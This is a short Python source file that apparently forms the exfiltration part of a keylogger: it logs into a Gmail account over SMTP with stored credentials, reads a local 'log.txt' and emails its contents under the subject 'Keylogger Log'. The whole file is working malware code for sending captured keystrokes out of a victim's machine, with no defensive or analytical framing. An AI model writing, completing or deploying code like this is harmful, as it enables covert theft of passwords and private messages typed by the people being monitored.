import smtplib
from cred import email, password

def send_email():
    try:
        # Create an SMTP session
        session = smtplib.SMTP('smtp.gmail.com', 587)
        session.starttls()  # Secure the connection

        # Log in to the email account
        session.login(email, password)

        # Read the log file
        with open('log.txt', 'r', encoding='utf-8') as file:
            message = file.read()

        # Prepare the email
        subject = "Keylogger Log"
        body = message
        email_message = f"Subject: {subject}\n\n{body}"

        # Send the email
        session.sendmail(email, email, email_message)

        print('\nEmail Sent')

    except Exception as e:
        print(f"An error occurred: {e}")

    finally:
        session.quit()  # Ensure the session is closed
